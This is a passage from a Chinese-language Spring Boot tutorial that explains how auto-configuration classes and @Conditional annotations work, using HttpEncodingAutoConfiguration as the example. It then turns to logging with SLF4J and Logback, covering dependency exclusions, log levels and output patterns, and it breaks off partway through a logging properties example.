Auto Configure</span><br><span class="line">org.springframework.boot.autoconfigure.EnableAutoConfiguration=\</span><br><span class="line">org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.amqp.RabbitAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.batch.BatchAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.cache.CacheAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.cassandra.CassandraAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.cloud.CloudAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.context.MessageSourceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.context.PropertyPlaceholderAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.couchbase.CouchbaseAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.dao.PersistenceExceptionTranslationAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.cassandra.CassandraDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.cassandra.CassandraRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.couchbase.CouchbaseDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.couchbase.CouchbaseRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.jpa.JpaRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.ldap.LdapDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.ldap.LdapRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.mongo.MongoDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.mongo.MongoRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.neo4j.Neo4jDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.neo4j.Neo4jRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.solr.SolrRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.redis.RedisRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.rest.RepositoryRestMvcAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.web.SpringDataWebAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.elasticsearch.jest.JestAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.freemarker.FreeMarkerAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.gson.GsonAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.h2.H2ConsoleAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.hateoas.HypermediaAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.hazelcast.HazelcastAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.hazelcast.HazelcastJpaDependencyAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.info.ProjectInfoAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.integration.IntegrationAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.JdbcTemplateAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.JndiDataSourceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.XADataSourceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jms.JmsAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jmx.JmxAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jms.JndiConnectionFactoryAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jms.activemq.ActiveMQAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jms.artemis.ArtemisAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.flyway.FlywayAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.groovy.template.GroovyTemplateAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jersey.JerseyAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jooq.JooqAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.kafka.KafkaAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.ldap.embedded.EmbeddedLdapAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.ldap.LdapAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.liquibase.LiquibaseAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mail.MailSenderAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mail.MailSenderValidatorAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mobile.DeviceResolverAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mobile.DeviceDelegatingViewResolverAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mobile.SitePreferenceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mongo.embedded.EmbeddedMongoAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mongo.MongoAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mustache.MustacheAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.reactor.ReactorAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.security.SecurityAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.security.SecurityFilterAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.security.FallbackWebSecurityAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.security.oauth2.OAuth2AutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.sendgrid.SendGridAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.session.SessionAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.social.SocialWebAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.social.FacebookAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.social.LinkedInAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.social.TwitterAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.solr.SolrAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.transaction.jta.JtaAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.validation.ValidationAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.DispatcherServletAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.EmbeddedServletContainerAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.HttpEncodingAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.HttpMessageConvertersAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.MultipartAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.ServerPropertiesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.WebClientAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.WebMvcAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.websocket.WebSocketAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.websocket.WebSocketMessagingAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.webservices.WebServicesAutoConfiguration</span><br></pre></td></tr></table></figure><p>每一个这样的  xxxAutoConfiguration类都是容器中的一个组件，都加入到容器中；用他们来做自动配置；</p><p>3）、每一个自动配置类进行自动配置功能；</p><p>4）、以<strong>HttpEncodingAutoConfiguration（Http编码自动配置）</strong>为例解释自动配置原理；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span>   <span class="comment">//表示这是一个配置类，以前编写的配置文件一样，也可以给容器中添加组件</span></span><br><span class="line"><span class="meta">@EnableConfigurationProperties</span>(HttpEncodingProperties.class)  <span class="comment">//启动指定类的ConfigurationProperties功能；将配置文件中对应的值和HttpEncodingProperties绑定起来；并把HttpEncodingProperties加入到ioc容器中</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@ConditionalOnWebApplication</span> <span class="comment">//Spring底层@Conditional注解（Spring注解版），根据不同的条件，如果满足指定的条件，整个配置类里面的配置就会生效；    判断当前应用是否是web应用，如果是，当前配置类生效</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@ConditionalOnClass</span>(CharacterEncodingFilter.class)  <span class="comment">//判断当前项目有没有这个类CharacterEncodingFilter；SpringMVC中进行乱码解决的过滤器；</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@ConditionalOnProperty</span>(prefix = <span class="string">"spring.http.encoding"</span>, value = <span class="string">"enabled"</span>, matchIfMissing = <span class="keyword">true</span>)  <span class="comment">//判断配置文件中是否存在某个配置  spring.http.encoding.enabled；如果不存在，判断也是成立的</span></span><br><span class="line"><span class="comment">//即使我们配置文件中不配置pring.http.encoding.enabled=true，也是默认生效的；</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpEncodingAutoConfiguration</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//他已经和SpringBoot的配置文件映射了</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> HttpEncodingProperties properties;</span><br><span class="line">  </span><br><span class="line">   <span class="comment">//只有一个有参构造器的情况下，参数的值就会从容器中拿</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">HttpEncodingAutoConfiguration</span><span class="params">(HttpEncodingProperties properties)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.properties = properties;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Bean</span>   <span class="comment">//给容器中添加一个组件，这个组件的某些值需要从properties中获取</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean</span>(CharacterEncodingFilter.class) <span class="comment">//判断容器没有这个组件？</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CharacterEncodingFilter <span class="title">characterEncodingFilter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">CharacterEncodingFilter filter = <span class="keyword">new</span> OrderedCharacterEncodingFilter();</span><br><span class="line">filter.setEncoding(<span class="keyword">this</span>.properties.getCharset().name());</span><br><span class="line">filter.setForceRequestEncoding(<span class="keyword">this</span>.properties.shouldForce(Type.REQUEST));</span><br><span class="line">filter.setForceResponseEncoding(<span class="keyword">this</span>.properties.shouldForce(Type.RESPONSE));</span><br><span class="line"><span class="keyword">return</span> filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据当前不同的条件判断，决定这个配置类是否生效？</p><p>一但这个配置类生效；这个配置类就会给容器中添加各种组件；这些组件的属性是从对应的properties类中获取的，这些类里面的每一个属性又是和配置文件绑定的；</p><p>5）、所有在配置文件中能配置的属性都是在xxxxProperties类中封装者‘；配置文件能配置什么就可以参照某个功能对应的这个属性类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"spring.http.encoding"</span>)  <span class="comment">//从配置文件中获取指定的值和bean的属性进行绑定</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpEncodingProperties</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Charset DEFAULT_CHARSET = Charset.forName(<span class="string">"UTF-8"</span>);</span><br></pre></td></tr></table></figure><p><strong>精髓：</strong></p><p>​    <strong>1）、SpringBoot启动会加载大量的自动配置类</strong></p><p>​    <strong>2）、我们看我们需要的功能有没有SpringBoot默认写好的自动配置类；</strong></p><p>​    <strong>3）、我们再来看这个自动配置类中到底配置了哪些组件；（只要我们要用的组件有，我们就不需要再来配置了）</strong></p><p>​    <strong>4）、给容器中自动配置类添加组件的时候，会从properties类中获取某些属性。我们就可以在配置文件中指定这些属性的值；</strong></p><p>xxxxAutoConfigurartion：自动配置类；</p><p>给容器中添加组件</p><p>xxxxProperties:封装配置文件中相关属性；</p><h3 id="2、细节"><a href="#2、细节" class="headerlink" title="2、细节"></a>2、细节</h3><h4 id="1、-Conditional派生注解（Spring注解版原生的-Conditional作用）"><a href="#1、-Conditional派生注解（Spring注解版原生的-Conditional作用）" class="headerlink" title="1、@Conditional派生注解（Spring注解版原生的@Conditional作用）"></a>1、@Conditional派生注解（Spring注解版原生的@Conditional作用）</h4><p>作用：必须是@Conditional指定的条件成立，才给容器中添加组件，配置配里面的所有内容才生效；</p><div class="table-container"><table><thead><tr><th>@Conditional扩展注解</th><th>作用（判断是否满足当前指定条件）</th></tr></thead><tbody><tr><td>@ConditionalOnJava</td><td>系统的java版本是否符合要求</td></tr><tr><td>@ConditionalOnBean</td><td>容器中存在指定Bean；</td></tr><tr><td>@ConditionalOnMissingBean</td><td>容器中不存在指定Bean；</td></tr><tr><td>@ConditionalOnExpression</td><td>满足SpEL表达式指定</td></tr><tr><td>@ConditionalOnClass</td><td>系统中有指定的类</td></tr><tr><td>@ConditionalOnMissingClass</td><td>系统中没有指定的类</td></tr><tr><td>@ConditionalOnSingleCandidate</td><td>容器中只有一个指定的Bean，或者这个Bean是首选Bean</td></tr><tr><td>@ConditionalOnProperty</td><td>系统中指定的属性是否有指定的值</td></tr><tr><td>@ConditionalOnResource</td><td>类路径下是否存在指定资源文件</td></tr><tr><td>@ConditionalOnWebApplication</td><td>当前是web环境</td></tr><tr><td>@ConditionalOnNotWebApplication</td><td>当前不是web环境</td></tr><tr><td>@ConditionalOnJndi</td><td>JNDI存在指定项</td></tr></tbody></table></div><p><strong>自动配置类必须在一定的条件下才能生效；</strong></p><p>我们怎么知道哪些自动配置类生效；</p><p><strong>==我们可以通过启用  debug=true属性；来让控制台打印自动配置报告==</strong>，这样我们就可以很方便的知道哪些自动配置类生效；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">=========================</span><br><span class="line">AUTO-CONFIGURATION REPORT</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Positive matches:（自动配置类启用的）</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">   DispatcherServletAutoConfiguration matched:</span><br><span class="line">      - <span class="meta">@ConditionalOnClass</span> found required <span class="class"><span class="keyword">class</span> '<span class="title">org</span>.<span class="title">springframework</span>.<span class="title">web</span>.<span class="title">servlet</span>.<span class="title">DispatcherServlet</span>'</span>; <span class="meta">@ConditionalOnMissingClass</span> <span class="function">did not find unwanted <span class="title">class</span> <span class="params">(OnClassCondition)</span></span></span><br><span class="line"><span class="function">      - @<span class="title">ConditionalOnWebApplication</span> <span class="params">(required)</span> found <span class="title">StandardServletEnvironment</span> <span class="params">(OnWebApplicationCondition)</span></span></span><br><span class="line"><span class="function">        </span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">Negative matches:（没有启动，没有匹配成功的自动配置类）</span></span><br><span class="line"><span class="function">-----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">   ActiveMQAutoConfiguration:</span></span><br><span class="line"><span class="function">      Did not match:</span></span><br><span class="line"><span class="function">         - @ConditionalOnClass did not find required classes 'javax.jms.ConnectionFactory', 'org.apache.activemq.ActiveMQConnectionFactory' <span class="params">(OnClassCondition)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">   AopAutoConfiguration:</span></span><br><span class="line"><span class="function">      Did not match:</span></span><br><span class="line"><span class="function">         - @ConditionalOnClass did not find required classes 'org.aspectj.lang.annotation.Aspect', 'org.aspectj.lang.reflect.Advice' <span class="params">(OnClassCondition)</span></span></span><br></pre></td></tr></table></figure><h1 id="三、日志"><a href="#三、日志" class="headerlink" title="三、日志"></a>三、日志</h1><h2 id="1、日志框架"><a href="#1、日志框架" class="headerlink" title="1、日志框架"></a>1、日志框架</h2><p> 小张；开发一个大型系统；</p><p>​        1、System.out.println(“”)；将关键数据打印在控制台；去掉？写在一个文件？</p><p>​        2、框架来记录系统的一些运行时信息；日志框架 ；  zhanglogging.jar；</p><p>​        3、高大上的几个功能？异步模式？自动归档？xxxx？  zhanglogging-good.jar？</p><p>​        4、将以前框架卸下来？换上新的框架，重新修改之前相关的API；zhanglogging-prefect.jar；</p><p>​        5、JDBC—-数据库驱动；</p><p>​            写了一个统一的接口层；日志门面（日志的一个抽象层）；logging-abstract.jar；</p><p>​            给项目中导入具体的日志实现就行了；我们之前的日志框架都是实现的抽象层；</p><p><strong>市面上的日志框架；</strong></p><p>JUL、JCL、Jboss-logging、logback、log4j、log4j2、slf4j….</p><div class="table-container"><table><thead><tr><th>日志门面  （日志的抽象层）</th><th>日志实现</th></tr></thead><tbody><tr><td><del>JCL（Jakarta  Commons Logging）</del>    SLF4j（Simple  Logging Facade for Java）    <strong><del>jboss-logging</del></strong></td><td>Log4j  JUL（java.util.logging）  Log4j2  <strong>Logback</strong></td></tr></tbody></table></div><p>左边选一个门面（抽象层）、右边来选一个实现；</p><p>日志门面：  SLF4J；</p><p>日志实现：Logback；</p><p>SpringBoot：底层是Spring框架，Spring框架默认是用JCL；‘</p><p>​    <strong>==SpringBoot选用 SLF4j和logback；==</strong></p><h2 id="2、SLF4j使用"><a href="#2、SLF4j使用" class="headerlink" title="2、SLF4j使用"></a>2、SLF4j使用</h2><h3 id="1、如何在系统中使用SLF4j-https-www-slf4j-org"><a href="#1、如何在系统中使用SLF4j-https-www-slf4j-org" class="headerlink" title="1、如何在系统中使用SLF4j   https://www.slf4j.org"></a>1、如何在系统中使用SLF4j   <a href="https://www.slf4j.org" target="_blank" rel="noopener">https://www.slf4j.org</a></h3><p>以后开发的时候，日志记录方法的调用，不应该来直接调用日志的实现类，而是调用日志抽象层里面的方法；</p><p>给系统里面导入slf4j的jar和  logback的实现jar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Logger logger = LoggerFactory.getLogger(HelloWorld.class);</span><br><span class="line">    logger.info(<span class="string">"Hello World"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>图示；</p><p><img src="images/concrete-bindings.png" alt="images/concrete-bindings.png"></p><p>每一个日志的实现框架都有自己的配置文件。使用slf4j以后，<strong>配置文件还是做成日志实现框架自己本身的配置文件；</strong></p><h3 id="2、遗留问题"><a href="#2、遗留问题" class="headerlink" title="2、遗留问题"></a>2、遗留问题</h3><p>a（slf4j+logback）: Spring（commons-logging）、Hibernate（jboss-logging）、MyBatis、xxxx</p><p>统一日志记录，即使是别的框架和我一起统一使用slf4j进行输出？</p><p><img src="images/legacy.png" alt=""></p><p><strong>如何让系统中所有的日志都统一到slf4j；</strong></p><p>==1、将系统中其他日志框架先排除出去；==</p><p>==2、用中间包来替换原有的日志框架；==</p><p>==3、我们导入slf4j其他的实现==</p><h2 id="3、SpringBoot日志关系"><a href="#3、SpringBoot日志关系" class="headerlink" title="3、SpringBoot日志关系"></a>3、SpringBoot日志关系</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SpringBoot使用它来做日志功能；</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>底层依赖关系</p><p><img src="images/搜狗截图20180131220946.png" alt=""></p><p>总结：</p><p>​    1）、SpringBoot底层也是使用slf4j+logback的方式进行日志记录</p><p>​    2）、SpringBoot也把其他的日志都替换成了slf4j；</p><p>​    3）、中间替换包？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"rawtypes"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">LogFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> String UNSUPPORTED_OPERATION_IN_JCL_OVER_SLF4J = <span class="string">"http://www.slf4j.org/codes.html#unsupported_operation_in_jcl_over_slf4j"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> LogFactory logFactory = <span class="keyword">new</span> SLF4JLogFactory();</span><br></pre></td></tr></table></figure><p><img src="images/搜狗截图20180131221411.png" alt=""></p><p>​    4）、如果我们要引入其他框架？一定要把这个框架的默认日志依赖移除掉？</p><p>​            Spring框架用的是commons-logging；</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>==SpringBoot能自动适配所有的日志，而且底层使用slf4j+logback的方式记录日志，引入其他框架的时候，只需要把这个框架依赖的日志框架排除掉即可；==</strong></p><h2 id="4、日志使用；"><a href="#4、日志使用；" class="headerlink" title="4、日志使用；"></a>4、日志使用；</h2><h3 id="1、默认配置"><a href="#1、默认配置" class="headerlink" title="1、默认配置"></a>1、默认配置</h3><p>SpringBoot默认帮我们配置好了日志；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//记录器</span></span><br><span class="line">Logger logger = LoggerFactory.getLogger(getClass());</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">contextLoads</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//System.out.println();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//日志的级别；</span></span><br><span class="line"><span class="comment">//由低到高   trace&lt;debug&lt;info&lt;warn&lt;error</span></span><br><span class="line"><span class="comment">//可以调整输出的日志级别；日志就只会在这个级别以以后的高级别生效</span></span><br><span class="line">logger.trace(<span class="string">"这是trace日志..."</span>);</span><br><span class="line">logger.debug(<span class="string">"这是debug日志..."</span>);</span><br><span class="line"><span class="comment">//SpringBoot默认给我们使用的是info级别的，没有指定级别的就用SpringBoot默认规定的级别；root级别</span></span><br><span class="line">logger.info(<span class="string">"这是info日志..."</span>);</span><br><span class="line">logger.warn(<span class="string">"这是warn日志..."</span>);</span><br><span class="line">logger.error(<span class="string">"这是error日志..."</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>    日志输出格式：        %d表示日期时间，        %thread表示线程名，        %-5level：级别从左显示5个字符宽度        %logger{50} 表示logger名字最长50个字符，否则按照句点分割。         %msg：日志消息，        %n是换行符    --&gt;    %d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n</code></pre><p>SpringBoot修改日志的默认配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">logging.level.com.atguigu=trace</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#logging.path=</span><br><span class="line"># 不指定路径在当前项目下生成springboot.log日志</span><br><span 